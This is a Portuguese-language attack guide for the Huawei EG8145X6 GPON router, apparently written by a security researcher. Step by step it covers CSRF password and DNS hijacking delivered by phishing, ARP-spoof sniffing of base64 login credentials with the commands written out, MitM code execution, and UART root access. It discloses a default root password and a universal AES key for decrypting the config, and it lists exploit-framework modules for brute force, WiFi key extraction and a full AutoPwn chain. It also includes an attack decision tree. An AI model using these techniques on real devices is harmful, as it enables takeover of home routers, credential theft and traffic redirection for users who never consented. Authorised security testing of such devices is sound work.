# Huawei EG8145X6 — Vetores de Ataque & Guia de PoC

> **Autor:** André Henrique (@mrhenrike) | União Geek  
> **Alvo:** Huawei OptiXstar EG8145X6-10 (GPON ONT)  
> **Aplica-se a:** EG8145X6, EG8145V5, EG8141A5, HN8145X6, HS8145X6

---

## Índice

1. [CSRF Remoto — Troca de Senha (Sem Acesso à LAN)](#1-csrf-remoto--troca-de-senha)
2. [CSRF DNS Poisoning (Ataque de Pharming)](#2-csrf-dns-poisoning)
3. [MitM — Interceptação de Credenciais](#3-mitm--interceptação-de-credenciais)
4. [MitM + RCE via dealDataWithFun()](#4-mitm--rce-via-dealdatawithfun)
5. [Acesso Físico — UART Shell + Decryptação de Config](#5-acesso-físico--uart-shell)
6. [Information Disclosure Pré-Auth](#6-information-disclosure-pré-auth)
7. [Enumeração de Usuários](#7-enumeração-de-usuários)
8. [Brute-Force com Bypass de Rate-Limit](#8-brute-force-com-bypass-de-rate-limit)
9. [Extração de Credenciais WiFi (Autenticado)](#9-extração-de-credenciais-wifi)
10. [Módulos Genéricos (GPON, UPnP, Shellshock)](#10-módulos-genéricos)
11. [AutoPwn — Cadeia Completa](#11-autopwn--cadeia-completa)

---

## 1. CSRF Remoto — Troca de Senha

**Severidade:** CRÍTICA  
**Requer:** Vítima com sessão ativa visitar página do atacante  
**Acesso à LAN:** NÃO — funciona de qualquer site na internet  
**Módulo:** `exploits/routers/huawei/eg8145x6_csrf_payload_generator`

### Por que Funciona

O token CSRF (`x.X_HW_Token`) do EG8145X6 é:
- **Estático** — `getRandString.asp` retorna o mesmo valor sempre
- **Não validado** — o servidor aceita tokens vazios, falsos ou ausentes

### Sintaxe RouterXPL

```
rxf > use exploits/routers/huawei/eg8145x6_csrf_payload_generator
rxf (EG8145X6 CSRF Gen) > set target 192.168.18.1
rxf (EG8145X6 CSRF Gen) > set action all
rxf (EG8145X6 CSRF Gen) > set new_password MinhaNovaSenh@!
rxf (EG8145X6 CSRF Gen) > set output_dir /tmp/csrf_payloads
rxf (EG8145X6 CSRF Gen) > run
```

Ações disponíveis: `password`, `dns`, `telnet`, `firewall`, `wifi`, `portfwd`, `all`

### Métodos de Entrega
- Email de phishing com anexo HTML
- Anúncio malicioso (malvertising)
- Waterhole attack (site comprometido que o admin visita)
- Link em redes sociais

---

## 2. CSRF DNS Poisoning

**Severidade:** ALTA  
**Requer:** Mesmo que CSRF acima  
**Acesso à LAN:** NÃO  
**Módulo:** `exploits/routers/huawei/eg8145x6_dns_poison_csrf`

### Impacto

Todos os dispositivos da rede passam a resolver DNS pelo servidor do atacante:
- Páginas falsas de banco/email → roubo de credenciais
- Distribuição de malware via atualizações falsas
- Persiste após reiniciar o roteador

```
rxf > use exploits/routers/huawei/eg8145x6_dns_poison_csrf
rxf (EG8145X6 DNS Poison) > set dns_primary 1.3.3.7
rxf (EG8145X6 DNS Poison) > run
```

---

## 3. MitM — Interceptação de Credenciais

**Severidade:** CRÍTICA  
**Requer:** Mesma LAN + alguém fazer login no router  
**Módulo:** `exploits/routers/huawei/eg8145x6_mitm_credential_intercept`

O login envia a senha como `base64encode(senha)` via HTTP puro (porta 80). Sem HTTPS.

```bash
# ARP spoof
sudo arpspoof -i eth0 -t <ip_vitima> 192.168.18.1

# Captura
sudo tcpdump -i eth0 -A 'host 192.168.18.1 and port 80' | grep -i 'PassWord='

# Decodificar
echo "YWRtaW4=" | base64 -d
```

---

## 4. MitM + RCE via dealDataWithFun()

**Severidade:** CRÍTICA  
**Requer:** Posição MitM + admin fazendo qualquer requisição ao router  

O `util.js` do firmware contém `Function()` constructor que executa qualquer código retornado em respostas AJAX. Interceptar e modificar a resposta = execução de código arbitrário.

---

## 5. Acesso Físico — UART Shell

**Severidade:** CRÍTICA (compromete totalmente o equipamento)  
**Requer:** Acesso físico ao dispositivo

### O que Precisa

- **Chave Phillips** — remover 2 parafusos na parte inferior
- **Adaptador UART** (USB-TTL, 3.3V) — CP2102, CH340, ou FTDI
- **Fios jumper** — 3 (TX, RX, GND)
- **Software terminal** — PuTTY, minicom, ou screen

### Desmontagem

1. **Remover parafusos**: 2 parafusos Phillips na parte inferior (podem estar sob pés de borracha)
2. **Abrir**: Use uma espátula plástica para separar as carcaças pela emenda
3. **Localizar pads UART**: Na PCB, procure 4 pads perto do SoC:
   - **GND** → conectar ao GND do adaptador
   - **TX** → conectar ao RX do adaptador
   - **RX** → conectar ao TX do adaptador
   - **VCC** → NÃO conectar (referência 3.3V apenas)
4. **Soldar pinos** ou usar clips de teste

### Conexão UART

```
Baud rate: 115200 | Data bits: 8 | Stop bits: 1 | Paridade: Nenhuma
```

### Credenciais Root

```
login: root
password: adminHW
```

### Decryptação do hw_ctree.xml

Chave AES universal: `13395537D2730554A176799F6D56A239`

```
rxf > use exploits/routers/huawei/eg8145x6_config_decrypt
rxf (EG8145X6 Config) > set target 192.168.18.1
rxf (EG8145X6 Config) > run
```

### Conteúdo do Config Decriptado
- Senha do admin (texto puro)
- SSIDs e senhas WiFi (todas as bandas)
- Credenciais PPPoE (ISP)
- URL e credenciais TR-069
- Flags Telnet/SSH
- Regras de port forwarding
- Configuração DNS
- Credenciais SIP/VoIP

---

## 6–8. Módulos de Reconhecimento e Brute-Force

```
rxf > use exploits/routers/huawei/eg8145x6_info_disclosure
rxf > use exploits/routers/huawei/eg8145x6_preauth_password_enum
rxf > use exploits/routers/huawei/eg8145x6_bruteforce_login
```

---

## 9. Extração de Credenciais WiFi

```
rxf > use exploits/routers/huawei/eg8145x6_wifi_credential_extractor
rxf (WiFi Extract) > set username admin
rxf (WiFi Extract) > set password <senha_conhecida>
rxf (WiFi Extract) > run
```

---

## 10. Módulos Genéricos

Testados no EG8145X6-10 (2026-04-05): todos bloqueados (403/timeout/refused). O ISP aplicou hardening. Porém, outros equipamentos da mesma família podem ser vulneráveis.

---

## 11. AutoPwn — Cadeia Completa

```
rxf > use exploits/routers/huawei/eg8145x6_autopwn
rxf (AutoPwn) > set target 192.168.18.1
rxf (AutoPwn) > run
```

10 fases automáticas: fingerprint → info disclosure → CSRF → enumeração → brute-force → config → JS capture → port scan → relatório → módulos genéricos.

---

## Árvore de Decisão de Ataque

```
Tem acesso à mesma rede?
├── SIM
│   ├── Admin está logado?
│   │   ├── SIM → Roubo de sessão (cookie sniff via ARP spoof)
│   │   └── NÃO → Esperar login (MitM) ou CSRF se sessão persistir
│   ├── Tem acesso físico?
│   │   ├── SIM → UART → hw_ctree.xml → pwn total
│   │   └── NÃO → MitM + brute-force + CSRF
│   └── Rode AutoPwn para cadeia automatizada
└── NÃO (remoto apenas)
    ├── Pode enviar link ao admin?
    │   ├── SIM → CSRF payload (trocar senha / DNS poison / ativar telnet)
    │   └── NÃO → Sem superfície de ataque remota sem phishing
    └── CSRF + DNS poison = vetor remoto mais impactante
```

---

> **Disclaimer:** Estas técnicas são documentadas exclusivamente para testes de segurança autorizados.  
> **Autor:** André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
